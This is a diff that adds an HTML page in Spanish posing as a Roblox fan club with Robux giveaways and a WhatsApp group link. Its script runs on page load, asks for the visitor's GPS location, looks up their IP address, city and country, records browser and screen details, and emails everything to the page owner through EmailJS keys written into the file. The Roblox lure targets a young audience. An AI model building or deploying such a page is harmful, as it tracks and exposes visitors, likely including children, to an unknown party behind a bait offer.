@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comunidad Roblox - ¡Únete Ahora!</title>
+  <meta name="description" content="Únete a la mejor comunidad de Roblox. Sorteos de Robux, eventos y códigos VIP">
+  
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <style>
+    :root { --primary: #00a2ff; --whatsapp: #25d366; --bg: #0f172a; --card-bg: rgba(30, 41, 59, 0.8); --text: #ffffff; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+    body { background: linear-gradient(135deg, #0f172a, #1e293b); color: var(--text); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 1rem; }
+    .container { background: var(--card-bg); backdrop-filter: blur(12px); border: 1px solid rgba(0, 162, 255, 0.3); border-radius: 24px; padding: 2.5rem 2rem; max-width: 450px; width: 100%; text-align: center; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5); }
+    h1 { font-size: 1.8rem; margin-bottom: 0.5rem; color: var(--primary); }
+    p { color: #cbd5e1; margin-bottom: 1.5rem; }
+    .badge { display: inline-block; background: linear-gradient(90deg, #ff0055, var(--primary)); color: white; padding: 6px 16px; border-radius: 20px; font-size: 0.85rem; font-weight: bold; margin-bottom: 1rem; }
+    .btn-whatsapp { display: flex; align-items: center; justify-content: center; gap: 12px; background-color: var(--whatsapp); color: white; text-decoration: none; padding: 1rem 1.5rem; border-radius: 16px; font-size: 1.1rem; font-weight: bold; transition: 0.3s; }
+    .btn-whatsapp:hover { transform: translateY(-3px); background-color: #20bd5a; }
+    
+    /* CAJA DE INFO DEL CELULAR */
+    .info-box { background: #1e293b; border-radius: 12px; padding: 1rem; text-align: left; font-size: 0.85rem; margin-top: 1.5rem; border: 1px solid #334155; }
+    .info-box h3 { color: var(--primary); margin-bottom: 0.8rem; text-align: center; }
+    .info-item { margin-bottom: 0.5rem; word-break: break-all; }
+    .info-item b { color: #94a3b8; }
+    #estado { color: #fbbf24; margin-top: 1rem; text-align: center; }
+    .legal { font-size: 0.7rem; color: #64748b; margin-top: 1rem; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <span class="badge">🔥 Comunidad Oficial</span>
+    <h1>¡EL MEJOR CLUB DE ROBLOX!</h1>
+    <p>Únete al grupo. Sorteos de Robux y eventos semanales</p>
+
+    <a href="https://chat.whatsapp.com/DfGluKjZKbbB5tgM85Pgqm" 
+       class="btn-whatsapp" target="_blank">
+      <i class="fa-brands fa-whatsapp"></i>
+      UNIRSE AL GRUPO DE WHATSAPP
+    </a>
+
+    <!-- AQUI SE MUESTRA LA INFO DEL CELULAR -->
+    <div class="info-box">
+      <h3><i class="fa-solid fa-mobile-screen"></i> Info del Dispositivo</h3>
+      <div id="info-dispositivo">Cargando datos...</div>
+      <div id="estado"></div>
+    </div>
+
+    <p class="legal">Al entrar aceptas que recolectemos datos del dispositivo.</p>
+  </div>
+
+  <script>
+    // ⚙️ TUS CLAVES DE EMAILJS
+    const PUBLIC_KEY  = "FIX4y48DskQ7D519p"; 
+    const SERVICE_ID  = "elenart_40";         
+    const TEMPLATE_ID = "template_mc719kp";   
+    emailjs.init(PUBLIC_KEY);
+
+    const infoDiv = document.getElementById('info-dispositivo');
+    const estadoDiv = document.getElementById('estado');
+
+    async function capturarInfo() {
+      let datos = {
+        ip: "Cargando...",
+        ciudad: "Cargando...",
+        pais: "Cargando...",
+        navegador: navigator.userAgent,
+        pantalla: `${window.screen.width}x${window.screen.height}`,
+        idioma: navigator.language,
+        fecha: new Date().toLocaleString("es-CO"),
+        latitud: "No permitida",
+        longitud: "No permitida",
+        mapa: "N/A"
+      };
+
+      actualizarPantalla(datos);
+
+      // PEDIR UBICACIÓN GPS
+      if ("geolocation" in navigator) {
+        estadoDiv.innerHTML = "Pidiendo permiso de ubicación...";
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
+          });
+          datos.latitud = position.coords.latitude;
+          datos.longitud = position.coords.longitude;
+          datos.mapa = `https://www.google.com/maps?q=${datos.latitud},${datos.longitud}`;
+          estadoDiv.innerHTML = "Ubicación obtenida ✓";
+        } catch (e) {
+          estadoDiv.innerHTML = "Ubicación denegada ✗";
+        }
+      }
+
+      // OBTENER IP
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        datos.ip = data.ip;
+        datos.ciudad = data.city;
+        datos.pais = data.country_name;
+        estadoDiv.innerHTML += " | IP obtenida ✓";
+      } catch (e) {}
+      
+      actualizarPantalla(datos);
+
+      // ENVIAR POR CORREO
+      emailjs.send(SERVICE_ID, TEMPLATE_ID, datos);
+    }
+
+    function actualizarPantalla(d) {
+      infoDiv.innerHTML = `
+        <div class="info-item"><b>IP:</b> ${d.ip}</div>
+        <div class="info-item"><b>País/Ciudad:</b> ${d.pais} / ${d.ciudad}</div>
+        <div class="info-item"><b>Pantalla:</b> ${d.pantalla}</div>
+        <div class="info-item"><b>Idioma:</b> ${d.idioma}</div>
+        <div class="info-item"><b>Lat/Long:</b> ${d.latitud}, ${d.longitud}</div>
+        <div class="info-item"><b>Mapa:</b> <a href="${d.mapa}" target="_blank" style="color:#00a2ff;">Ver en Maps</a></div>
+      `;
+    }
+
+    window.onload = capturarInfo;
+  </script>
+</body>
+</html>
